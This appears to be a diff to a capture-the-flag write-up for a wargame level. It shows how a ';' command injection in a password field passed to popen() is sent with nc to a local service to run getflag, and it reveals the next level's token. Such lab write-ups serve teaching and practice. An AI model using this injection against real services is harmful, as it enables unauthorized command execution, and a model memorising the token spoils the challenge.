@@ -15,10 +15,11 @@ we can see the string hacked "NotSoEasy", let try to su flag11, password not mat
 We can now try to inject some code to the password passed in popen(), to execute getflag
 let connect and set the password to inject getflag command with a ";" to finish the "echo" command and a "wall" cammand who print the output on all current tty, because without, it will print only for "server" tty,
 	nc 127.0.0.1 5151
-	; getflag | wall
+	; getflag > /tmp/token11
 or
-	echo "; getflag | wall" | nc 127.0.0.1 5151
+	echo "; getflag > /tmp/token11" | nc 127.0.0.1 5151
 
-We can now see the output and obtain the token.
+We can now see the /tmp/token file with the output
+	cat /tmp/token11
 
 Token for level12 is: "fa6v5ateaw21peobuub8ipe6s"
